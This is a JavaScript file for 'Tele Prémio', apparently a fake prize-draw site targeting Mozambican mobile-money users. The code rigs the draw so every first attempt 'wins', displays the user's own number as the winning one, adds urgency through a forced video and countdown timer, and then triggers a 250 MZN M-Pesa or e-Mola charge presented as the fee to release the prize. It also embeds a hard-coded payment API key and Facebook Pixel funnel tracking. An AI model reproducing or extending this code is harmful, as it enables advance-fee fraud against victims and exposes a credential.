/* =============================================
   TELE PRÉMIO – script.js
   Payblack API: https://h.paymoz.tech/api/v1/pagamentos/
============================================= */

/* ---- State ---- */
const state = {
  nome: '',
  celular: '',
  provincia: '',
  luckyNumber: 0,
  currentStep: 1
};

const prizes = [
  { name: 'Primeiro Prémio', amount: '150.000 MT' },
  { name: 'Segundo Prémio',  amount: '100.000 MT' },
  { name: 'Terceiro Prémio', amount: '50.000 MT'  },
  { name: 'Quarto Prémio',   amount: '25.000 MT'  },
  { name: 'Quinto Prémio',   amount: '10.000 MT'  },
];

/* ---- Step Navigation ---- */
function goToStep(n) {
  // Handle step-lose as special state
  let current;
  if (state.currentStep === 'lose') {
    current = document.getElementById('step-lose');
  } else {
    current = document.getElementById('step' + state.currentStep);
  }
  const next = document.getElementById('step' + n);
  if (!next) return;
  if (current) current.classList.remove('active');
  next.classList.add('active');
  state.currentStep = n;
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

/* ---- Form Submit ---- */
function submitRegistration(e) {
  e.preventDefault();
  state.nome      = document.getElementById('nome').value.trim();
  state.celular   = document.getElementById('celular').value.trim();
  state.provincia = document.getElementById('provincia').value;
  if (!state.nome || !state.celular || !state.provincia) return;
  
  // Facebook Pixel Event: Lead
  if (typeof fbq !== 'undefined') fbq('track', 'Lead');
  
  goToStep(2);
}

/* ---- Lucky Number Confirm ---- */
function confirmLuckyNumber() {
  const input = document.getElementById('lucky-number-input');
  const num = parseInt(input.value, 10);
  if (!input.value || isNaN(num) || num < 1 || num > 1000) {
    input.style.borderColor = '#E74C3C';
    input.focus();
    setTimeout(() => input.style.borderColor = 'var(--orange)', 1200);
    return;
  }
  state.luckyNumber = num;
  goToStep(4);
  startDrawing();
}

/* ---- Drawing Animation ---- */
function startDrawing() {
  const digit1 = document.getElementById('digit-1');
  const digit2 = document.getElementById('digit-2');
  const digit3 = document.getElementById('digit-3');
  const statusText = document.getElementById('drawing-status-text');
  const progressBar = document.getElementById('drawing-progress');
  
  let currentDelay = 40;
  let elapsed = 0;
  const duration = 3500;

  const messages = [
    "Conectando ao sistema de sorteio...",
    "A procurar número da sorte...",
    "A processar o sorteio...",
    "Quase lá..."
  ];
  let msgIndex = 0;

  const statusInterval = setInterval(() => {
    msgIndex = (msgIndex + 1) % messages.length;
    statusText.textContent = messages[msgIndex];
  }, 800);

  function roll() {
    digit1.textContent = Math.floor(Math.random() * 10);
    digit2.textContent = Math.floor(Math.random() * 10);
    digit3.textContent = Math.floor(Math.random() * 10);
    
    currentDelay *= 1.08; 
    elapsed += currentDelay;

    let progress = Math.min((elapsed / duration) * 100, 100);
    progressBar.style.width = progress + '%';

    if (elapsed < duration) {
      setTimeout(roll, currentDelay);
    } else {
      clearInterval(statusInterval);
      statusText.textContent = "Sorteio concluído!";
      progressBar.style.width = '100%';
      
      const luckyStr = String(state.luckyNumber).padStart(3, '0');
      if (luckyStr.length > 3) {
        digit1.textContent = luckyStr[0];
        digit2.textContent = luckyStr[1];
        digit3.textContent = luckyStr.slice(2);
      } else {
        digit1.textContent = luckyStr[0];
        digit2.textContent = luckyStr[1];
        digit3.textContent = luckyStr[2];
      }
      
      setTimeout(showWinner, 1000);
    }
  }

  roll();
}

/* ---- Show Winner ---- */
function showWinner() {
  // --- PRIMEIRA TENTATIVA: sempre ganha ---
  const weights = [5, 10, 15, 25, 45];
  const r = Math.random() * 100;
  let cumulative = 0, prizeIndex = 4;
  for (let i = 0; i < weights.length; i++) {
    cumulative += weights[i];
    if (r < cumulative) { prizeIndex = i; break; }
  }

  const won = prizes[prizeIndex];
  const firstName = state.nome.split(' ')[0] || 'Campeão';

  document.getElementById('winner-display-name').textContent = firstName.toUpperCase();
  document.getElementById('prize-won-name').textContent  = won.name;
  document.getElementById('prize-won-amount').textContent = won.amount;
  document.getElementById('winner-lucky-num').textContent = state.luckyNumber;

  goToStep(5);
  setTimeout(launchConfetti, 300);
}

/* ---- Tela de Derrota ---- */
function showLoss() {
  // Gerar número sorteado diferente do do utilizador
  let drawnNum;
  do { drawnNum = Math.floor(Math.random() * 1000) + 1; }
  while (drawnNum === state.luckyNumber);

  const firstName = state.nome.split(' ')[0] || 'Amigo';
  document.getElementById('lose-name').textContent        = firstName.toUpperCase();
  document.getElementById('lose-drawn-num').textContent   = drawnNum;
  document.getElementById('lose-your-num-val').textContent = state.luckyNumber;

  // Esconder step atual, mostrar step-lose
  const current = document.getElementById('step' + state.currentStep);
  if (current) current.classList.remove('active');
  const loseEl = document.getElementById('step-lose');
  if (loseEl) loseEl.classList.add('active');
  state.currentStep = 'lose';
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

/* ---- Tentar Novamente ---- */
function tryAgain() {
  const input = document.getElementById('lucky-number-input');
  if (input) input.value = ''; // zera o input

  const loseEl = document.getElementById('step-lose');
  if (loseEl) loseEl.classList.remove('active');
  state.currentStep = 1; // para goToStep funcionar
  goToStep(3);           // volta ao passo do número da sorte
}

/* ---- Receber Prémio → Forma de Pagamento (step 8) ---- */
function receberPremio() {
  const wonAmt = document.getElementById('prize-won-amount').textContent;
  
  // Facebook Pixel Event: AddToCart
  if (typeof fbq !== 'undefined') fbq('track', 'AddToCart');

  // Actualiza o texto do prémio no step 8
  const subText = document.getElementById('payment-sub-text');
  if (subText) subText.textContent = 'Escolha como deseja receber o seu prémio de ' + wonAmt;
  const btnAmt = document.getElementById('btn-prize-amt');
  if (btnAmt) btnAmt.textContent = wonAmt;
  goToStep(8);
}

/* ---- Do formulário de pagamento → Video Gate (step 6) ---- */
function goToVideoGate() {
  const wonAmt = document.getElementById('prize-won-amount').textContent;
  
  // Facebook Pixel Event: ViewContent
  if (typeof fbq !== 'undefined') fbq('track', 'ViewContent');

  const el = document.getElementById('vg-prize-amount');
  if (el) el.textContent = wonAmt;
  goToStep(6);
}

/* ---- Video Page & Timer ---- */
const BUTTON_APPEAR_SEC = 115; // 1 min e 55 seg

function goToVideoPage() {
  goToStep(7);
  const video = document.getElementById('vsl-video');
  const overlay = document.getElementById('unmute-overlay');
  if (!video) return;

  // Reset
  video.currentTime = 0;
  const verifyBtn = document.getElementById('btn-verify');
  const verifyMsg = document.getElementById('verify-timer-msg');
  if (verifyBtn) verifyBtn.style.display = 'none';
  if (verifyMsg) verifyMsg.textContent = 'O botão aparecerá após assistir ao vídeo…';

  if (overlay) overlay.style.display = 'block';

  // Remove previous listener to avoid duplicates
  video.removeEventListener('timeupdate', onVideoProgress);
  video.addEventListener('timeupdate', onVideoProgress);

  // Try autoplay muted so the video starts playing in the background
  video.muted = true;
  video.play().catch(() => {
    // Autoplay blocked completely, user must click overlay to start
  });
}

function unmuteAndPlay() {
  const video = document.getElementById('vsl-video');
  const overlay = document.getElementById('unmute-overlay');
  
  if (overlay) overlay.style.display = 'none';
  
  if (video) {
    video.currentTime = 0; // Reinicia o vídeo do zero
    video.muted = false;
    video.volume = 1.0;
    const playPromise = video.play();
    if (playPromise !== undefined) {
      playPromise.catch(e => console.log("Play failed:", e));
    }
  }
}

function onVideoProgress() {
  const video     = document.getElementById('vsl-video');
  const verifyBtn = document.getElementById('btn-verify');
  const verifyMsg = document.getElementById('verify-timer-msg');
  if (!video) return;

  const elapsed = video.currentTime;

  // Mostrar botão após BUTTON_APPEAR_SEC segundos (1:55)
  if (elapsed >= BUTTON_APPEAR_SEC && verifyBtn && verifyBtn.style.display === 'none') {
    verifyBtn.style.display = 'flex';
    if (verifyMsg) verifyMsg.style.display = 'none'; // Esconde a mensagem quando o botão aparece
  }
}

/* ---- Payment Method Selector (Step 8) ---- */
function selectPayment(type) {
  const mpesa = document.getElementById('pm-mpesa');
  const emola = document.getElementById('pm-emola');
  const label = document.getElementById('pm-number-label');
  if (type === 'mpesa') {
    mpesa.classList.add('selected');
    emola.classList.remove('selected');
    if (label) label.textContent = 'Número de M-Pesa';
  } else {
    emola.classList.add('selected');
    mpesa.classList.remove('selected');
    if (label) label.textContent = 'Número de E-Mola';
  }
}

/* ---- Go to Checkout — redireciona para o checkout externo ---- */
function goToCheckout() {
  // Facebook Pixel Event: InitiateCheckout
  if (typeof fbq !== 'undefined') fbq('track', 'InitiateCheckout');
  
  window.location.href = 'https://stf4.ofertas.my/pay-v2/8e9b6232-0fc1-4e52-9cf6-521836ded7c4';
}

/* ---- Checkout Countdown ---- */
let checkoutCountdown = null;
function startCheckoutCountdown() {
  let totalSec = 4 * 60 + 1; // start at 04:01 like the image
  if (checkoutCountdown) clearInterval(checkoutCountdown);
  checkoutCountdown = setInterval(() => {
    if (totalSec <= 0) { clearInterval(checkoutCountdown); return; }
    totalSec--;
    const m  = Math.floor(totalSec / 60);
    const s  = totalSec % 60;
    const el = document.getElementById('checkout-timer');
    if (el) el.textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
  }, 1000);
}

/* ---- Checkout Payment Method — with dynamic placeholder ---- */
function selectCoPayment(type) {
  const mpesaBtn = document.getElementById('co-mpesa-btn');
  const emolaBtn = document.getElementById('co-emola-btn');
  const chkMpesa = document.getElementById('check-mpesa');
  const chkEmola = document.getElementById('check-emola');
  const telInput = document.getElementById('co-telefone');
  const waInput  = document.getElementById('co-phone');

  if (type === 'mpesa') {
    mpesaBtn.classList.add('selected');
    emolaBtn.classList.remove('selected');
    if (chkMpesa) chkMpesa.style.display = 'inline';
    if (chkEmola) chkEmola.style.display = 'none';
    // M-Pesa numbers start with 84 or 85
    if (telInput) telInput.placeholder = '84xxxxxxx';
    if (waInput)  waInput.placeholder  = '84xxxxxxx';
  } else {
    emolaBtn.classList.add('selected');
    mpesaBtn.classList.remove('selected');
    if (chkEmola) chkEmola.style.display = 'inline';
    if (chkMpesa) chkMpesa.style.display = 'none';
    // e-Mola numbers start with 86 or 87
    if (telInput) telInput.placeholder = '87xxxxxxx';
    if (waInput)  waInput.placeholder  = '87xxxxxxx';
  }
}

/* ---- Coupon Toggle ---- */
function toggleCoupon() {
  const row = document.getElementById('coupon-row');
  if (row) row.style.display = row.style.display === 'none' ? 'block' : 'none';
}

/* =============================================
   PAYBLACK API — chamada directa com CORS proxy
   (corsproxy.io reencaminha o pedido sem bloqueio do browser)
============================================= */
const PAYBLACK_KEY  = 'pk_25vq62dAbRZXgrOkbnRxMV9x-4OKEnsThInBAPBYhx8';
const CORS_PROXY    = 'https://corsproxy.io/?url=';
const MPESA_URL     = CORS_PROXY + encodeURIComponent('https://h.paymoz.tech/api/v1/pagamentos/c2b/pay/');
const EMOLA_URL     = CORS_PROXY + encodeURIComponent('https://h.paymoz.tech/api/v1/pagamentos/emola/c2b/pay/');
const AMOUNT        = 250;

async function finalizarCompra() {
  const nameVal = document.getElementById('co-nome').value.trim();
  const telVal  = document.getElementById('co-telefone').value.trim();
  const waVal   = document.getElementById('co-phone').value.trim();
  const phone   = telVal || waVal;

  // — Validação —
  if (!nameVal) {
    shakeField('co-nome');
    showCheckoutMsg('Por favor, preencha o seu nome completo.', 'error');
    return;
  }
  if (!phone) {
    shakeField('co-telefone');
    showCheckoutMsg('Por favor, preencha o número de telefone.', 'error');
    return;
  }

  // Formatar msisdn: remover espaços/+/- e adicionar prefixo 258
  let msisdn = phone.replace(/[\s+\-()\u00a0]/g, '');
  if (!msisdn.startsWith('258')) msisdn = '258' + msisdn;
  if (msisdn.length !== 12) {
    showCheckoutMsg('Número inválido. Use formato 84XXXXXXX ou 87XXXXXXX (9 dígitos).', 'error');
    return;
  }

  const isEmola   = document.getElementById('co-emola-btn').classList.contains('selected');
  const reference = 'tele-premio-' + Date.now();
  const btn       = document.querySelector('.btn-checkout-buy');
  const origHTML  = btn.innerHTML;

  // Loading
  btn.disabled = true;
  btn.innerHTML = '<span class="pay-spinner"></span> A processar…';
  clearCheckoutMsg();

  try {
    let url, body;

    if (isEmola) {
      url  = EMOLA_URL;
      body = { msisdn, amount: AMOUNT, nome_cliente: nameVal, reference };
    } else {
      url  = MPESA_URL;
      body = { msisdn, amount: AMOUNT, reference };
    }

    const resp = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type'  : 'application/json',
        'Authorization' : 'ApiKey ' + PAYBLACK_KEY,
        'x-requested-with': 'XMLHttpRequest',
      },
      body: JSON.stringify(body),
    });

    const data = await resp.json();

    if (data.success === true) {
      showPaymentSuccess(nameVal, msisdn, isEmola, data);
    } else {
      const errMsg = data.message || 'Pagamento recusado. Verifique o saldo e tente novamente.';
      showCheckoutMsg('❌ ' + errMsg, 'error');
      btn.disabled = false;
      btn.innerHTML = origHTML;
    }

  } catch (err) {
    showCheckoutMsg('❌ Erro de ligação. Verifique a sua internet e tente novamente.', 'error');
    btn.disabled = false;
    btn.innerHTML = origHTML;
  }
}

/* ---- Payment Success Screen ---- */
function showPaymentSuccess(name, msisdn, isEmola, data) {
  const card   = document.querySelector('#step9 .checkout-card');
  const txId   = isEmola
    ? (data.emola_txid   || data.transaction_id)
    : (data.mpesa_transaction_id || data.transaction_id);
  const method = isEmola ? 'e-Mola' : 'M-Pesa';
  const firstName = name.split(' ')[0] || name;

  if (checkoutCountdown) clearInterval(checkoutCountdown);

  card.innerHTML = `
    <div style="text-align:center;padding:28px 12px;">
      <div style="font-size:64px;margin-bottom:14px;">✅</div>
      <h2 style="font-size:22px;font-weight:900;color:#27AE60;margin-bottom:6px;">
        Pedido Enviado!
      </h2>
      <p style="font-size:14px;color:#555;line-height:1.8;margin-bottom:18px;">
        Olá <strong>${firstName}</strong>, uma notificação <strong>${method}</strong> foi enviada para<br>
        <span style="font-size:17px;font-weight:800;color:#1A1A2E;">+${msisdn}</span>
      </p>
      <div style="background:#F0FDF4;border:1.5px solid #BBF7D0;border-radius:12px;padding:16px 18px;margin-bottom:18px;text-align:left;">
        <p style="font-size:13px;color:#166534;font-weight:700;margin-bottom:5px;">📱 Confirme no seu telemóvel</p>
        <p style="font-size:12px;color:#166534;line-height:1.6;">
          Abra a notificação <strong>${method}</strong> e confirme o pagamento de
          <strong>250 MZN</strong> para liberar o seu prémio.
        </p>
      </div>
      ${txId ? `<p style="font-size:11px;color:#bbb;margin-bottom:12px;">ID: ${txId}</p>` : ''}
      <button onclick="goToStep(1)" style="
        width:100%;padding:14px;
        background:#F5A623;color:#fff;
        border:none;border-radius:8px;
        font-family:Inter,sans-serif;font-size:14px;font-weight:800;
        cursor:pointer;letter-spacing:0.5px;
        box-shadow:0 4px 14px rgba(245,166,35,0.4);
        transition:background 0.2s;
      " onmouseover="this.style.background='#E09010'" onmouseout="this.style.background='#F5A623'">
        ← Voltar ao Início
      </button>
    </div>
  `;
}

/* ---- Checkout UI Helpers ---- */
function showCheckoutMsg(msg, type) {
  let el = document.getElementById('checkout-msg');
  if (!el) {
    el = document.createElement('div');
    el.id = 'checkout-msg';
    const btn = document.querySelector('.btn-checkout-buy');
    if (btn) btn.parentNode.insertBefore(el, btn);
  }
  const isErr = type === 'error';
  el.style.cssText = `
    padding:10px 14px;border-radius:8px;font-size:13px;font-weight:600;
    margin-bottom:10px;text-align:center;line-height:1.5;
    background:${isErr ? '#FEE2E2' : '#DCFCE7'};
    color:${isErr ? '#991B1B' : '#166534'};
    border:1px solid ${isErr ? '#FCA5A5' : '#86EFAC'};
  `;
  el.textContent = msg;
}

function clearCheckoutMsg() {
  const el = document.getElementById('checkout-msg');
  if (el) el.remove();
}

function shakeField(id) {
  const el = document.getElementById(id);
  if (!el) return;
  el.style.borderColor = '#E74C3C';
  el.style.boxShadow   = '0 0 0 3px rgba(231,76,60,0.15)';
  setTimeout(() => {
    el.style.borderColor = '';
    el.style.boxShadow   = '';
  }, 1600);
}

/* ---- Hamburger Menu ---- */
let menuOpen = false;
function toggleMenu() {
  menuOpen = !menuOpen;
  const menu = document.getElementById('mobile-menu');
  const btn  = document.getElementById('hamburger-btn');
  if (menu) {
    if (menuOpen) menu.classList.add('open'); else menu.classList.remove('open');
  }
  if (btn) {
    if (menuOpen) btn.classList.add('open'); else btn.classList.remove('open');
    btn.setAttribute('aria-expanded', menuOpen);
  }
}
function closeMenu() {
  menuOpen = false;
  const menu = document.getElementById('mobile-menu');
  const btn  = document.getElementById('hamburger-btn');
  if (menu) menu.classList.remove('open');
  if (btn)  { btn.classList.remove('open'); btn.setAttribute('aria-expanded', false); }
}

/* ---- Confetti ---- */
function launchConfetti() {
  const canvas = document.getElementById('confetti-canvas');
  const ctx    = canvas.getContext('2d');
  canvas.width  = window.innerWidth;
  canvas.height = window.innerHeight;

  const particles = Array.from({ length: 140 }, () => ({
    x: Math.random() * canvas.width,
    y: -10 - Math.random() * 80,
    r: 4 + Math.random() * 6,
    d: 2 + Math.random() * 3,
    color: ['#F5A623','#1A2B6B','#FFD580','#FFFFFF','#FF6B35'][Math.floor(Math.random()*5)],
    tilt: Math.random() * 10 - 10,
    tiltAngle: 0,
    tiltSpeed: 0.07 + Math.random() * 0.05,
  }));

  let frame = 0;
  const maxFrames = 180;

  function draw() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    particles.forEach(p => {
      ctx.beginPath();
      ctx.lineWidth   = p.r / 2;
      ctx.strokeStyle = p.color;
      ctx.moveTo(p.x + p.tilt + p.r / 4, p.y);
      ctx.lineTo(p.x + p.tilt, p.y + p.tilt + p.r / 4);
      ctx.stroke();
      p.y += p.d;
      p.tiltAngle += p.tiltSpeed;
      p.tilt = Math.sin(p.tiltAngle) * 12;
      if (p.y > canvas.height + 10) {
        p.y = -10; p.x = Math.random() * canvas.width;
      }
    });
    frame++;
    if (frame < maxFrames) requestAnimationFrame(draw);
    else ctx.clearRect(0, 0, canvas.width, canvas.height);
  }
  draw();
}

/* ---- Resize canvas ---- */
window.addEventListener('resize', () => {
  const c = document.getElementById('confetti-canvas');
  if (c) { c.width = window.innerWidth; c.height = window.innerHeight; }
});
